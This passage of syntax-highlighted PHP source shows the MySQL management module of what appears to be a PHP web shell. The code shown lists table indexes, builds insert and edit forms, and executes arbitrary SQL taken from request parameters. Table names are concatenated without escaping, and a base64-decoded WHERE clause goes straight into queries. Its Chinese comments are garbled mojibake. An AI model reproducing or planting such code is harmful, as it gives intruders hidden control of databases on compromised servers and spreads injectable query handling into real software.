                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Type&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Unique&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Packed&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Seq_in_index&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Field&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Cardinality&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Collation&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Null&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Comment&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$rowdb</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$thisbg</span> <span class="o">=</span> <span class="nx">bg</span><span class="p">();</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;&quot; onmouseover=&quot;this.className=\&#39;focus\&#39;;&quot; onmouseout=&quot;this.className=\&#39;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;\&#39;;&quot;&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Key_name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Index_type&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Non_unique&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;No&#39;</span> <span class="o">:</span> <span class="s1">&#39;Yes&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Packed&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="k">null</span> <span class="o">?</span> <span class="s1">&#39;No&#39;</span> <span class="o">:</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Packed&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Seq_in_index&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Column_name&#39;</span><span class="p">]</span><span class="o">.</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Sub_part&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;(&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Sub_part&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;)&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Cardinality&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Cardinality&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Collation&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Null&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Comment&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nx">tbfoot</span><span class="p">();</span>
                <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;insert&#39;</span> <span class="o">||</span> <span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;edit&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s1">&#39;SHOW COLUMNS FROM &#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="p">);</span>
                    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$rowdb</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$rs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;insert&#39;</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Insert new line in &#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39; table &amp;raquo;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Update record in &#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39; table &amp;raquo;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nv">$where</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$base64</span><span class="p">);</span>
                        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM </span><span class="si">$tablename</span><span class="s2"> WHERE </span><span class="si">$where</span><span class="s2"> LIMIT 1&quot;</span><span class="p">);</span>
                        <span class="nv">$rs</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;form method=&quot;post&quot; action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="nv">$dbform</span><span class="p">);</span>
                    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;mysqladmin&#39;</span><span class="p">);</span>
                    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;tablename&#39;</span><span class="p">,</span><span class="nv">$tablename</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;table border=&quot;0&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot;&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$rowdb</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]])</span> <span class="p">{</span>
                            <span class="nv">$value</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]]);</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                            <span class="nv">$value</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="nv">$thisbg</span> <span class="o">=</span> <span class="nx">bg</span><span class="p">();</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;&quot; onmouseover=&quot;this.className=\&#39;focus\&#39;;&quot; onmouseout=&quot;this.className=\&#39;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;\&#39;;&quot;&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;UNI&#39;</span> <span class="o">||</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Extra&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;auto_increment&#39;</span> <span class="o">||</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;PRI&#39;</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Type&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>                           
                            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Type&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea class=&quot;area&quot; name=&quot;insertsql[&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;]&quot; style=&quot;width:500px;height:60px;overflow:auto;&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;insert&#39;</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nx">bg</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;td colspan=&quot;2&quot;&amp;gt;&amp;lt;input class=&quot;bt&quot; type=&quot;submit&quot; name=&quot;insert&quot; value=&quot;Insert&quot; /&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nx">bg</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;td colspan=&quot;2&quot;&amp;gt;&amp;lt;input class=&quot;bt&quot; type=&quot;submit&quot; name=&quot;update&quot; value=&quot;Update&quot; /&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">,</span> <span class="nv">$base64</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$querys</span> <span class="o">=</span> <span class="o">@</span><span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">,</span><span class="nv">$sql_query</span><span class="p">);</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$querys</span> <span class="k">as</span> <span class="nv">$num</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$query</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Query#</span><span class="si">{</span><span class="nv">$num</span><span class="si">}</span><span class="s2"> : &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nx">ENT_QUOTES</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">);</span>
                            <span class="k">switch</span><span class="p">(</span><span class="nx">qy</span><span class="p">(</span><span class="nv">$query</span><span class="p">))</span>
                            <span class="p">{</span>
                                <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Error : &#39;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="k">break</span><span class="p">;</span>    
                                <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">13</span><span class="p">))</span> <span class="o">==</span> <span class="s1">&#39;select * from&#39;</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nv">$allowedit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                                    <span class="p">}</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="nv">$getnumsql</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nv">$tatol</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nx">q</span><span class="p">(</span><span class="nv">$getnumsql</span><span class="p">));</span>
                                        <span class="nv">$multipage</span> <span class="o">=</span> <span class="nx">multi</span><span class="p">(</span><span class="nv">$tatol</span><span class="p">,</span> <span class="nv">$pagenum</span><span class="p">,</span> <span class="nv">$page</span><span class="p">,</span> <span class="nv">$tablename</span><span class="p">);</span>
                                    <span class="p">}</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$tablename</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nv">$sql_line</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&quot;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">),</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$query</span><span class="p">)));</span>
                                        <span class="nv">$sql_line</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\/\*[^(\*\/)]*\*\//i&quot;</span><span class="p">,</span> <span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nv">$sql_line</span><span class="p">);</span>
                                        <span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">&quot;/from\s+`{0,1}([\w]+)`{0,1}\s+/i&quot;</span><span class="p">,</span><span class="nv">$sql_line</span><span class="p">,</span><span class="nv">$matches</span><span class="p">);</span>
                                        <span class="nv">$tablename</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
                                    <span class="p">}</span>

                                    <span class="sd">/*********************/</span>
                                    <span class="nv">$getfield</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SHOW COLUMNS FROM </span><span class="si">$tablename</span><span class="s2">&quot;</span><span class="p">);</span>
                                    <span class="nv">$rowdb</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                                    <span class="nv">$keyfied</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="c1">//Ö÷¼ü×Ö¶Î</span>
                                    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$getfield</span><span class="p">))</span> <span class="p">{</span>
                                        <span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]][</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Key&#39;</span><span class="p">];</span>
                                        <span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]][</span><span class="s1">&#39;Extra&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Extra&#39;</span><span class="p">];</span>
                                        <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;UNI&#39;</span> <span class="o">||</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;PRI&#39;</span><span class="p">)</span> <span class="p">{</span>
                                            <span class="nv">$keyfied</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">];</span>
                                        <span class="p">}</span>
                                    <span class="p">}</span>
                                    <span class="sd">/*********************/</span>                             
                                    <span class="c1">//Ö±½Óä¯ÀÀ±í°´ÕÕÖ÷¼ü½µÐòÅÅÁÐ</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="nv">$keyfied</span> <span class="o">&amp;&amp;</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">13</span><span class="p">))</span> <span class="o">==</span> <span class="s1">&#39;select * from&#39;</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nv">$query</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; LIMIT &quot;</span><span class="p">,</span> <span class="s2">&quot; order by </span><span class="si">$keyfied</span><span class="s2"> DESC LIMIT &quot;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
                                    <span class="p">}</span>

                                    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>

                                    <span class="nx">p</span><span class="p">(</span><span class="nv">$multipage</span><span class="p">);</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;table border=&quot;0&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot;&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="nv">$allowedit</span><span class="p">)</span> <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Action&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="nv">$fieldnum</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
                                    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$fieldnum</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
                                        <span class="nv">$name</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
                                        <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_field_type</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
                                        <span class="nv">$len</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_field_len</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
                                        <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;td nowrap&amp;gt;</span><span class="si">$name</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;</span><span class="si">$type</span><span class="s2">(</span><span class="si">$len</span><span class="s2">)&quot;</span><span class="o">.</span><span class="p">((</span><span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$name</span><span class="p">][</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;UNI&#39;</span> <span class="o">||</span> <span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$name</span><span class="p">][</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;PRI&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;b&amp;gt; - PRIMARY&amp;lt;/b&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$name</span><span class="p">][</span><span class="s1">&#39;Extra&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;auto_increment&#39;</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;b&amp;gt; - Auto&amp;lt;/b&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">);</span>
                                    <span class="p">}</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                                    
                                    <span class="k">while</span><span class="p">(</span><span class="nv">$mn</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
                                        <span class="nv">$thisbg</span> <span class="o">=</span> <span class="nx">bg</span><span class="p">();</span>
                                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;&quot; onmouseover=&quot;this.className=\&#39;focus\&#39;;&quot; onmouseout=&quot;this.className=\&#39;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;\&#39;;&quot;&amp;gt;&#39;</span><span class="p">);</span>
                                        <span class="nv">$where</span> <span class="o">=</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$b1</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
                                        <span class="c1">//Ñ¡È¡Ìõ¼þ×Ö¶ÎÓÃ</span>
                                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$mn</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$inside</span><span class="p">){</span>
                                            <span class="k">if</span> <span class="p">(</span><span class="nv">$inside</span><span class="p">)</span> <span class="p">{</span>
                                                <span class="c1">//²éÕÒÖ÷¼ü¡¢Î¨Ò»ÊôÐÔ¡¢×Ô¶¯Ôö¼ÓµÄ×Ö¶Î£¬ÕÒµ½¾ÍÍ£Ö¹£¬·ñÔò×éºÏËùÓÐ×Ö¶Î×÷ÎªÌõ¼þ¡£</span>
                                                <span class="k">if</span> <span class="p">(</span><span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;UNI&#39;</span> <span class="o">||</span> <span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;Extra&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;auto_increment&#39;</span> <span class="o">||</span> <span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;PRI&#39;</span><span class="p">)</span> <span class="p">{</span>
                                                    <span class="nv">$where</span> <span class="o">=</span> <span class="nv">$key</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$inside</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
                                                    <span class="k">break</span><span class="p">;</span>
                                                <span class="p">}</span>
